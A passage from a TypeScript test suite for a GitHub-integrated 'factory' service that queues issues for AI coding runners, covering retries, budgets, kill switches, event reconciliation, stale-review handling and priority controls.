    await f.factory.onPullClosed(42, true);
    expect(f.saved().items[0].state).toBe("launched");
    expect(f.saved().science.red).toBe(1);
  });
  it("deduplicates issue deliveries and retains source context", async () => {
    const f = fixture();
    const issue = { number: 7, title: "Broken checkout", body: "A customer cannot buy", url: "https://github.com/r3dbars/demo/issues/7", labels: ["bug"] };
    await f.factory.ingestIssue(issue);
    await f.factory.ingestIssue(issue);
    expect(f.saved().items).toHaveLength(1);
    expect(f.saved().items[0].body).toContain("A customer cannot buy");
  });
  it("queues work without burning retries when Meta is not configured", async () => {
    const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })]);
    await f.factory.alarm();
    expect(f.saved().items[0].attempts).toBe(0);
    expect(f.saved().machines.find((m) => m.id === "assembler-1")?.state).toBe("blocked");
    expect(f.saved().tick).toBe(1);
  });
  it("un-sticks the hosted assembler once a local agent plugs in, even with nothing left in the queue", async () => {
    const f = fixture([item({ state: "queued", prNumber: undefined, attempts: 0 })]);
    await f.factory.alarm();
    expect(f.saved().machines.find((m) => m.id === "assembler-1")?.state).toBe("blocked");
    f.data.set("state", { ...f.saved(), items: [] });
    f.data.set("runnerPresence", { harnesses: ["codex"], seenAt: Date.now() });
    await f.reload().alarm();
    expect(f.saved().machines.find((m) => m.id === "assembler-1")?.state).toBe("idle");
  });
  it("accepts build commands but ignores malformed messages and removal of active machinery", async () => {
    const f = fixture();
    await f.factory.webSocketMessage(authorizedSocket(), "not JSON");
    await f.factory.webSocketMessage(authorizedSocket(), JSON.stringify({ type: "place_machine", machineType: "assembler", harness: "spark", x: 8, y: 0 }));
    expect(f.saved().machines.at(-1)?.powerId).toBe("steam-spark");
    expect(f.saved().machines).toHaveLength(starterLine().machines.length + 1);
  });
  it("stops rework after three attempts and never launches unmerged PRs", async () => {
    const f = fixture([item({ state: "rejected", attempts: 3 })]);
    await f.factory.alarm();
    expect(f.saved().items[0].state).toBe("rejected");
    await f.factory.onPullClosed(42, false);
    expect(f.saved().items).toHaveLength(0);
    expect(f.saved().science.red).toBe(0);
  });
});


it("offers local runner plans only for real GitHub issues and refuses source-only enqueue", async () => {
  const external = [item({ id: "posthog-dictation", source: "posthog", state: "queued", prNumber: undefined }), item({ id: "sentry-123", source: "sentry", state: "queued", prNumber: undefined }), item({ id: "gh-999", source: "inbox", state: "queued", prNumber: undefined }), item({ id: "github-invalid", source: "github_issue", state: "queued", prNumber: undefined })];
  const valid = item({ id: "gh-125", state: "queued", prNumber: undefined });
  for (const items of [external, [...external, valid]]) {
    const f = fixture(items);
    f.data.set("openMoves", [{ id: "stale-posthog-plan", title: "Plan #thog-dictation", why: "Legacy offer", itemId: external[0].id, stage: "build", kind: "build", createdAt: 1, options: [{ id: "codex", label: "Plan with Codex", recommended: true, actions: [{ tool: "plan_runner_job", args: { harness: "codex" }, reason: "Legacy offer" }] }] }]);
    const pairing = await f.factory.pairRunner();
    await f.factory.claimRunner(pairing, ["codex"]);
    await (f.factory as unknown as { offerRunnerPlan(): Promise<void> }).offerRunnerPlan();
    const plans = (f.saved().deck ?? []).filter(move => move.options.some(option => option.actions.some(action => action.tool === "plan_runner_job")));
    expect(plans.map(move => move.itemId)).toEqual(items.includes(valid) ? ["gh-125"] : []);
    for (const item of external) await expect(f.factory.enqueueRunner({ itemId: item.id, harness: "codex", allowedPaths: ["server/src/factory.ts"], needsApproval: true })).rejects.toThrow("not available");
    expect(await f.factory.runnerJobs()).toEqual([]);
  }
});

it("enforces a zero job cap and kill switch before admitting runner work", async () => {
  for (const extraEnv of [{ FACTORY_CONCURRENT_JOBS: "0" }, { SPARK_DISABLED: "1" }]) {
    const f = fixture([item({ state: "queued", prNumber: undefined })], extraEnv);
    await expect(f.factory.enqueueRunner({ itemId: "gh-1", harness: "codex", allowedPaths: ["server/src/engine.ts"] })).rejects.toThrow("job budget");
    expect(await f.factory.runnerJobs()).toEqual([]);
  }
});

it("a budget-denied triage logs exactly one honest fallback with the budget reason", async () => {
  const { testD1 } = await import("./d1-fixture");
  const db = testD1();
  await db.prepare("INSERT INTO user_repos(user_id, repo, installation_id) VALUES (1, 'r3dbars/demo', 1)").run();
  const f = fixture([], { DB: db, META_API_KEY: "test", SPARK_DAILY_CALLS: "0" });
  const splitter = f.factory as unknown as { load(): Promise<unknown>; sparkTriage(item: { title: string; body: string }, districts: string[]): Promise<unknown> };
  await splitter.load();
  expect(await splitter.sparkTriage({ title: "Fix a bug", body: "" }, ["/"])).toMatchObject({ kind: "bug" });
  expect(f.saved().brain?.fallbacks).toBe(1);
  expect(f.saved().brain?.thoughts[0].reason).toContain("budget exhausted");
});

it('watchdog survives restart, offers one scar/card, and alarm always recovers from a broken tick', async () => {
  const f = fixture([item({ state: 'working', prNumber: undefined, updatedAt: Date.now() - 31 * 60000 })]);
  await f.factory.alarm();
  expect(f.saved().items[0].scars?.map(s => s.reason)).toEqual(['stuck at working']);
  expect(f.saved().deck?.some(m => m.id.startsWith('stuck:'))).toBe(true);
  await f.reload().alarm();
  expect(f.saved().items[0].scars).toHaveLength(1);
  const broken = f.reload();
  (broken as unknown as { pollPostHog: () => Promise<void> }).pollPostHog = async () => { throw new Error('one bad poll'); };
  await broken.alarm();
  expect(f.data.has('reliabilityFailure:pollPostHog')).toBe(true);
  expect(f.alarm()).toBeGreaterThan(Date.now());
  expect(f.alarm()).toBeLessThanOrEqual(Date.now() + 60000);
  expect(f.saved().deck?.some(m => m.id === 'reliability:pollPostHog')).toBe(true);
});

it('completed DO delivery tombstones prevent replay even when D1 intake raced', async () => {
  const f = fixture();
  let calls = 0;
  const internals = f.factory as unknown as { handleGitHub: () => Promise<void> };
  internals.handleGitHub = async () => { calls++; };
  await f.factory.enqueueGitHub('same-delivery', 'unknown', {});
  await f.factory.alarm();
  await f.factory.enqueueGitHub('same-delivery', 'unknown', {});
  await f.factory.alarm();
  expect(calls).toBe(1);
  expect(f.data.get('done:delivery:same-delivery')).toBeGreaterThan(Date.now());
});

it('exhausted deliveries leave a durable dead letter and player card while later work continues', async () => {
  const f = fixture();
  const internals = f.factory as unknown as { handleGitHub: (event: string) => Promise<void> };
  let healthy = 0;
  internals.handleGitHub = async event => { if (event === 'bad') throw new Error('bad payload'); healthy++; };
  await f.factory.enqueueGitHub('broken', 'bad', {});
  for (let i = 0; i < 5; i++) {
    const pending = f.data.get('delivery:broken') as Record<string, unknown> | undefined;
    if (pending) pending.nextAt = 0;
    await f.factory.alarm();
  }
  await f.factory.enqueueGitHub('healthy', 'good', {});
  await f.factory.alarm();
  expect(f.data.has('failed:delivery:broken')).toBe(true);
  expect(f.data.has('delivery:broken')).toBe(false);
  expect(f.saved().deck?.some(m => m.id === 'failed:delivery:broken')).toBe(true);
  expect(healthy).toBe(1);
  await f.factory.enqueueGitHub('broken', 'bad', {});
  expect(f.data.has('delivery:broken')).toBe(false);
});

it('reconciliation repairs missed merge, close, moved head and check-run events independently', async () => {
  const keys = await crypto.subtle.generateKey({ name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' }, true, ['sign', 'verify']);
  const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey('pkcs8', keys.privateKey)).toString('base64')}\n-----END PRIVATE KEY-----`;
  const f = fixture([1, 2, 3, 4].map(n => item({ id: `gh-${n}`, prNumber: n, state: 'inspecting', branch: 'shiptorio/runner-test', inspection: { headSha: 'old', state: 'pending', humanApproved: false, stages: [{ gate: 'ci', state: 'pending', reason: 'waiting' }, { gate: 'verify', state: 'pending', reason: 'waiting' }, { gate: 'ai', state: 'pending', reason: 'waiting' }, { gate: 'human', state: 'pending', reason: 'waiting' }] } })), { GITHUB_APP_ID: '1', GITHUB_APP_PRIVATE_KEY: pem });
  f.data.set('reconcileAt', 0);
  let publicationRecovery = false;
  const original = globalThis.fetch;
  globalThis.fetch = (async (input: unknown) => {
    const url = String(input);
    if (url.includes('/pulls?state=all')) return Response.json(publicationRecovery ? [{ number: 1, html_url: 'https://github.com/r3dbars/demo/pull/1', state: 'closed', merged_at: '2026-10-26', head: { ref: 'shiptorio/runner-old', sha: 'old' } }] : []);
    if (url.endsWith('/access_tokens')) return Response.json({ token: 'test' });
    if (url.includes('/check-runs?')) return Response.json({ total_count: 1, check_runs: [{ name: 'CI', status: 'completed', conclusion: 'success' }] });
    if (url.includes('/status?')) return Response.json({ total_count: 0, statuses: [] });
    if (url.includes('/files?')) return Response.json([{ filename: 'server/src/engine.ts' }]);
    const n = Number(url.split('/').at(-1));
    return Response.json({ state: n < 3 ? 'closed' : 'open', merged: n === 1, head: { sha: n === 3 ? 'new' : 'old' }, merge_commit_sha: 'merged' });
  }) as typeof fetch;
  try {
    await (f.factory as unknown as { load: () => Promise<boolean> }).load();
    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
    expect(f.saved().items.find(i => i.id === 'gh-1')?.state).toBe('launched');
    expect(f.saved().items.some(i => i.id === 'gh-2')).toBe(false);
    expect(f.saved().items.find(i => i.id === 'gh-3')?.inspection?.headSha).toBe('new');
    expect(f.saved().items.find(i => i.id === 'gh-4')?.inspection?.stages[0].state).toBe('passed');
    expect(f.saved().science.red).toBe(1);
    f.data.set('reconcileAt', 0);
    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
    expect(f.saved().science.red).toBe(1);
    // An old published PR must not attach itself to fresh ore after orbit reopens it.
    publicationRecovery = true;
    const live = (f.factory as unknown as { state: FactoryState }).state;
    live.items = [{ ...live.items[0], state: "queued", prNumber: undefined, prUrl: undefined }];
    f.data.set('runnerJob:old-publication', { id: 'old-publication', itemId: 'gh-1', repo: 'r3dbars/demo', branch: 'shiptorio/runner-old', status: 'completed' });
    f.data.set('reconcileAt', 0);
    await (f.factory as unknown as { reconcileGitHub: () => Promise<void> }).reconcileGitHub();
    expect(live.items[0].prNumber).toBeUndefined();
    expect(live.items[0].state).toBe('queued');
  } finally { globalThis.fetch = original; }
});


it('does not retry a durable delivery before its persisted backoff deadline', async () => {
  const f = fixture();
  let calls = 0;
  (f.factory as unknown as { handleGitHub: () => Promise<void> }).handleGitHub = async () => { calls++; throw new Error('unavailable'); };
  await f.factory.enqueueGitHub('backoff', 'bad', {});
  await f.factory.alarm();
  await f.factory.alarm();
  expect(calls).toBe(1);
  const pending = f.data.get('delivery:backoff') as { nextAt: number };
  expect(pending.nextAt).toBeGreaterThan(Date.now());
});

it("GitHub cooldown preserves durable deliveries without exhausting processing retries", async () => {
  const { RateLimitError } = await import("../src/rate-limit");
  const f = fixture();
  const retryAt = Date.now() + 3600000;
  let calls = 0;
  (f.factory as unknown as { handleGitHub(): Promise<void> }).handleGitHub = async () => { calls++; throw new RateLimitError(retryAt); };
  await f.factory.enqueueGitHub("rate-limited", "issues", {});
  await f.factory.alarm();
  await f.factory.alarm();
  expect(calls).toBe(1);
  expect(f.data.get("delivery:rate-limited")).toMatchObject({ attempts: 0, nextAt: retryAt });
  expect(f.data.has("failed:delivery:rate-limited")).toBe(false);
});

for (const outcome of ["pass", "error", "comment"] as const) {
  it(`discards an old-head AI review when the head moves during ${outcome === "comment" ? "comment publication" : outcome === "error" ? "a failed review" : "review"}`, async () => {
    const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
    const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey("pkcs8", keys.privateKey)).toString("base64")}\n-----END PRIVATE KEY-----`;
    const oldHead = "b".repeat(40), newHead = "c".repeat(40);
    const reviewing = (sha: string) => setStage(setStage(item({ state: "inspecting", branch: "shiptorio/runner-1", inspection: freshInspection(sha) }), "ci", "passed", "green"), "verify", "passed", "proof");
    const f = fixture([reviewing(oldHead)], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "test" });
    const internals = f.factory as unknown as { load(): Promise<unknown>; runGauntlet(): Promise<void>; patch(patch: { items: Item[] }): Promise<void>; think: (...args: unknown[]) => Promise<unknown> };
    let release!: () => void, started!: () => void;
    const waiting = new Promise<void>(resolve => { release = resolve; });
    const entered = new Promise<void>(resolve => { started = resolve; });
    const comments: string[] = [];
    const original = globalThis.fetch;
    globalThis.fetch = (async (input: unknown, init?: RequestInit) => {
      const url = String(input);
      if (url.includes("/comments?")) return Response.json([]);
      if (url.endsWith("/access_tokens")) return Response.json({ token: "test" });
      if (url.includes("/files?")) return Response.json([{ filename: "server/src/cart.ts", status: "modified", patch: "-old\n+fixed" }]);
      if (url.endsWith("/issues/42/comments")) {
        comments.push(JSON.parse(String(init?.body)).body);
        if (outcome === "comment") { started(); await waiting; }
        return Response.json({ id: 1 });
      }
      throw new Error(`Unexpected request ${url}`);
    }) as typeof fetch;
    internals.think = async () => {
      if (outcome !== "comment") { started(); await waiting; }
      if (outcome === "error") throw new Error("Old review failed");
      return { verdict: "pass", reason: "Old diff is correct", findings: [] };
    };
    try {
      await internals.load();
      const run = internals.runGauntlet();
      await entered;
      // A new head has completed CI and proof while the previous review is still awaiting I/O.
      await internals.patch({ items: [reviewing(newHead)] });
      release();
      await run;
      expect(f.saved().items[0].inspection?.headSha).toBe(newHead);
      expect(stageOf(f.saved().items[0], "ai")?.state).toBe("pending");
      expect(f.saved().items[0].state).toBe("inspecting");
      expect(f.saved().items[0].scars ?? []).toHaveLength(0);
      expect(comments).toHaveLength(outcome === "comment" ? 1 : 0);
      if (comments.length) expect(comments[0]).toContain(`shiptorio-review-head:${oldHead}`);
      // The replacement commit still receives its own review on the next run.
      await internals.runGauntlet();
      expect(stageOf(f.saved().items[0], "ai")?.state).toBe(outcome === "error" ? "rework" : "passed");
      if (outcome !== "error") expect(comments.at(-1)).toContain(`shiptorio-review-head:${newHead}`);
    } finally { release(); globalThis.fetch = original; }
  });
}

it("budget and rate-limit waits leave AI review pending without a rework scar", async () => {
  const { BudgetError } = await import("../src/budget");
  const { RateLimitError } = await import("../src/rate-limit");
  const keys = await crypto.subtle.generateKey({ name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" }, true, ["sign", "verify"]);
  const pem = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(await crypto.subtle.exportKey("pkcs8", keys.privateKey)).toString("base64")}\n-----END PRIVATE KEY-----`;
  const original = globalThis.fetch;
  globalThis.fetch = (async (url: unknown) => String(url).endsWith("/access_tokens") ? Response.json({ token: "paused-review-token" }) : Response.json([])) as unknown as typeof fetch;
  try {
    for (const error of [new BudgetError("Spark daily budget exhausted"), new RateLimitError(Date.now() + 60000)]) {
      const reviewing = setStage(setStage(item({ state: "inspecting", inspection: freshInspection("head") }), "ci", "passed", "green"), "verify", "passed", "proof");
      const f = fixture([reviewing], { GITHUB_APP_ID: "1", GITHUB_APP_PRIVATE_KEY: pem, META_API_KEY: "test" });
      const internals = f.factory as unknown as { load(): Promise<unknown>; runGauntlet(): Promise<void>; think(): Promise<unknown> };
      internals.think = async () => { throw error; };
      await internals.load();
      await internals.runGauntlet();
      expect(f.saved().items[0].state).toBe("inspecting");
      expect(stageOf(f.saved().items[0], "ai")?.state).toBe("pending");
      expect(f.saved().items[0].scars ?? []).toEqual([]);
    }
  } finally { globalThis.fetch = original; }
});

describe("Rush and Park from a cart's callout", () => {
  const waiting = (id: string, over: Partial<Item> = {}) => item({ id, title: `Issue ${id}`, state: "queued", prNumber: undefined, attempts: 0, ...over });
  const send = (f: ReturnType<typeof fixture>, raw: unknown, socket = authorizedSocket()) => f.factory.webSocketMessage(socket, JSON.stringify(raw));

  it("rushes, parks and unparks a waiting item, and says so on the floor log", async () => {
    const f = fixture([waiting("gh-1"), waiting("gh-2")], { SPARK_DISABLED: "1" });
    await send(f, { type: "set_priority", itemId: "gh-2", priority: "rush" });
    expect(f.saved().items.find((i) => i.id === "gh-2")?.priority).toBe("rush");
    expect(f.events.some((e: any) => e.type === "log" && e.itemId === "gh-2" && /Rushed/.test(e.text))).toBe(true);
    await send(f, { type: "set_priority", itemId: "gh-1", priority: "park" });
    expect(f.saved().items.find((i) => i.id === "gh-1")?.priority).toBe("park");
    await send(f, { type: "set_priority", itemId: "gh-1", priority: "none" });
    expect(f.saved().items.find((i) => i.id === "gh-1")?.priority).toBeUndefined();
  });

  it("ignores items already on the line, unknown items and bad choices", async () => {
    const f = fixture([waiting("gh-1", { state: "working" })], { SPARK_DISABLED: "1" });
    const before = structuredClone(f.saved());
    for (const raw of [
      { type: "set_priority", itemId: "gh-1", priority: "rush" },
      { type: "set_priority", itemId: "gh-1", priority: "none" },
      { type: "set_priority", itemId: "gh-404", priority: "park" },
      { type: "set_priority", itemId: "gh-1", priority: "first" },
    ]) await send(f, raw);
    expect(f.saved().items).toEqual(before.items);
  });

  it("needs the same signed-in write socket as every other player action", async () => {
    const f = fixture([waiting("gh-1")], { SPARK_DISABLED: "1" });
    const unauthorized = authorizedSocket();
    unauthorized.serializeAttachment(null);
    const closed: unknown[][] = [];
    unauthorized.close = (...args) => { closed.push(args); };
    await send(f, { type: "set_priority", itemId: "gh-1", priority: "rush" }, unauthorized);
    expect(closed).toEqual([[1008, "Sign in again"]]);
    expect(f.saved().items[0].priority).toBeUndefined();
  });

  it("offers the next plan for the rushed item first and never for a parked one", async () => {
    const f = fixture([waiting("gh-1"), waiting("gh-2", { priority: "rush" }), waiting("gh-3", { priority: "park" })], { SPARK_DISABLED: "1" });
    f.data.set("runnerPresence", { harnesses: ["codex"], seenAt: Date.now() });
    const offer = (f.factory as unknown as { offerRunnerPlan(): Promise<void> }).offerRunnerPlan.bind(f.factory);
    await offer();
    // the plans in the order they were offered (the deck re-ranks what it shows; this is the line's order)
    const offered = (f.factory as unknown as { openMoves: { title: string; itemId?: string }[] }).openMoves;
    const planned = offered.filter((m) => m.title.startsWith("Plan")).map((m) => m.itemId);
    expect(planned).toEqual(["gh-2", "gh-1"]);
  });
});
